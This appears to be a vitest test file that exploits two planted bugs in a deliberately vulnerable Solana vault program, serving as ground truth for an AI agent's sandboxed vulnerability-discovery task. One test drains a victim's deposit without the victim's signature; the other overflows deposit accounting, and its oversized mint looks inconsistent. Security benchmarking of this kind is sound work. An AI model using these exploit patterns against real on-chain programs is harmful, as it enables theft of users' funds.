import { describe, it, expect, beforeAll } from "vitest";

import * as anchor from "@coral-xyz/anchor";
import {
  TOKEN_PROGRAM_ID,
  createAssociatedTokenAccount,
  createMint,
  getAccount,
  mintTo,
} from "@solana/spl-token";
import { Keypair, LAMPORTS_PER_SOL, PublicKey, SystemProgram } from "@solana/web3.js";

import { getProvider } from "./setup.js";

// ─── Local exploit suite ─────────────────────────────────────────────────
// These tests are the ground truth for the agent's discovery target. Each
// one proves a planted bug from a known-keys position; the agent has to
// rediscover the same outcomes from a black-box snapshot inside the
// private sandbox. If a test ever starts failing because the bug got
// fixed in vulnerable-vault, that's a hint we'd need to re-plant a
// different one for the demo.

const VAULT_PROGRAM_ID = new PublicKey(
  "CbdZT6zkBvgfaWCPUooeTkCZDuRz8Rfwmnhw2Nu6ZooC",
);

const VAULT_SEED = Buffer.from("vault");
const VAULT_AUTHORITY_SEED = Buffer.from("vault-authority");
const POSITION_SEED = Buffer.from("position");

interface VaultCtx {
  provider: anchor.AnchorProvider;
  program: anchor.Program;
  mint: PublicKey;
  vault: PublicKey;
  vaultAuthority: PublicKey;
  vaultTokenAccount: PublicKey;
}

async function setupVault(): Promise<VaultCtx> {
  const provider = getProvider();
  // Late-load the IDL produced by `anchor build`. We import dynamically so
  // a fresh clone surfaces a clear error when build hasn't run yet.
  const idl = require("../target/idl/vulnerable_vault.json");
  const program = new anchor.Program(idl, provider) as unknown as anchor.Program;

  const authority = (provider.wallet as anchor.Wallet).payer;

  const mint = await createMint(provider.connection, authority, authority.publicKey, null, 6);

  const [vault] = PublicKey.findProgramAddressSync(
    [VAULT_SEED, mint.toBuffer()],
    VAULT_PROGRAM_ID,
  );
  const [vaultAuthority] = PublicKey.findProgramAddressSync(
    [VAULT_AUTHORITY_SEED, vault.toBuffer()],
    VAULT_PROGRAM_ID,
  );

  const vaultTokenAccount = Keypair.generate();
  await program.methods
    .initializeVault()
    .accounts({
      authority: authority.publicKey,
      mint,
      vault,
      vaultAuthority,
      vaultTokenAccount: vaultTokenAccount.publicKey,
      systemProgram: SystemProgram.programId,
      tokenProgram: TOKEN_PROGRAM_ID,
    })
    .signers([vaultTokenAccount])
    .rpc();

  return {
    provider,
    program,
    mint,
    vault,
    vaultAuthority,
    vaultTokenAccount: vaultTokenAccount.publicKey,
  };
}

async function makeFundedUser(
  ctx: VaultCtx,
  initialTokens: bigint,
): Promise<{ user: Keypair; tokenAccount: PublicKey }> {
  const user = Keypair.generate();
  const sig = await ctx.provider.connection.requestAirdrop(user.publicKey, LAMPORTS_PER_SOL);
  await ctx.provider.connection.confirmTransaction(sig, "confirmed");

  const authority = (ctx.provider.wallet as anchor.Wallet).payer;
  const tokenAccount = await createAssociatedTokenAccount(
    ctx.provider.connection,
    user,
    ctx.mint,
    user.publicKey,
  );
  if (initialTokens > 0n) {
    await mintTo(
      ctx.provider.connection,
      authority,
      ctx.mint,
      tokenAccount,
      authority,
      initialTokens,
    );
  }
  return { user, tokenAccount };
}

describe("vulnerable-vault exploit suite", () => {
  let ctx: VaultCtx;

  beforeAll(async () => {
    ctx = await setupVault();
  });

  it("BUG #2 — withdraw lands without the position owner's signature", async () => {
    const { user: victim, tokenAccount: victimTokens } = await makeFundedUser(ctx, 1_000_000n);
    const { user: attacker, tokenAccount: attackerTokens } = await makeFundedUser(ctx, 0n);

    const [position] = PublicKey.findProgramAddressSync(
      [POSITION_SEED, ctx.vault.toBuffer(), victim.publicKey.toBuffer()],
      VAULT_PROGRAM_ID,
    );

    await ctx.program.methods
      .openPosition()
      .accounts({
        owner: victim.publicKey,
        vault: ctx.vault,
        position,
        systemProgram: SystemProgram.programId,
      })
      .signers([victim])
      .rpc();

    await ctx.program.methods
      .deposit(new anchor.BN(1_000_000))
      .accounts({
        owner: victim.publicKey,
        vault: ctx.vault,
        position,
        vaultTokenAccount: ctx.vaultTokenAccount,
        userTokenAccount: victimTokens,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([victim])
      .rpc();

    // Attacker drains the victim's position WITHOUT signing as the victim.
    // The attacker's keypair is the only signer on the tx (it pays fees);
    // `owner` is passed as the victim's pubkey and is unchecked by the
    // program because of the missing has_one constraint.
    await ctx.program.methods
      .withdraw(new anchor.BN(1_000_000))
      .accounts({
        owner: victim.publicKey,
        vault: ctx.vault,
        position,
        vaultTokenAccount: ctx.vaultTokenAccount,
        vaultAuthority: ctx.vaultAuthority,
        recipientTokenAccount: attackerTokens,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([attacker])
      .rpc();

    const after = await getAccount(ctx.provider.connection, attackerTokens);
    expect(after.amount).toBe(1_000_000n);
  });

  it("BUG #1 — deposit accounting wraps on overflow", async () => {
    const { user, tokenAccount } = await makeFundedUser(ctx, 0n);

    const [position] = PublicKey.findProgramAddressSync(
      [POSITION_SEED, ctx.vault.toBuffer(), user.publicKey.toBuffer()],
      VAULT_PROGRAM_ID,
    );
    await ctx.program.methods
      .openPosition()
      .accounts({
        owner: user.publicKey,
        vault: ctx.vault,
        position,
        systemProgram: SystemProgram.programId,
      })
      .signers([user])
      .rpc();

    // Mint enough that two near-u64::MAX deposits will wrap the running
    // total. We use a pair of deposits because Anchor emits a `solana
    // _program::overflow` panic if we try to construct a single tx that
    // shoves u64::MAX through. The wrap shows up in the post-state of
    // `vault.total_deposits`.
    const big = (1n << 63n) + 1n; // > i64 max, easy wrap on second add
    const authority = (ctx.provider.wallet as anchor.Wallet).payer;
    await mintTo(
      ctx.provider.connection,
      authority,
      ctx.mint,
      tokenAccount,
      authority,
      big * 2n,
    );

    await ctx.program.methods
      .deposit(new anchor.BN(big.toString()))
      .accounts({
        owner: user.publicKey,
        vault: ctx.vault,
        position,
        vaultTokenAccount: ctx.vaultTokenAccount,
        userTokenAccount: tokenAccount,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([user])
      .rpc();

    await ctx.program.methods
      .deposit(new anchor.BN(big.toString()))
      .accounts({
        owner: user.publicKey,
        vault: ctx.vault,
        position,
        vaultTokenAccount: ctx.vaultTokenAccount,
        userTokenAccount: tokenAccount,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([user])
      .rpc();

    const vaultAccount = await ctx.program.account.vault.fetch(ctx.vault);
    // After two deposits of `big`, raw arithmetic gives 2*big > u64::MAX
    // and wraps. INV-1 (Σ position.balance == vault.total_deposits) still
    // holds on the wrapped values, but INV-2 (SPL balance == total_deposits)
    // does not — that's the discovery surface for the agent.
    const onChainTotal = BigInt(vaultAccount.totalDeposits.toString());
    const wrapped = (big * 2n) & ((1n << 64n) - 1n);
    expect(onChainTotal).toBe(wrapped);

    const tokenAcct = await getAccount(ctx.provider.connection, ctx.vaultTokenAccount);
    expect(tokenAcct.amount).not.toBe(onChainTotal);
  });
});
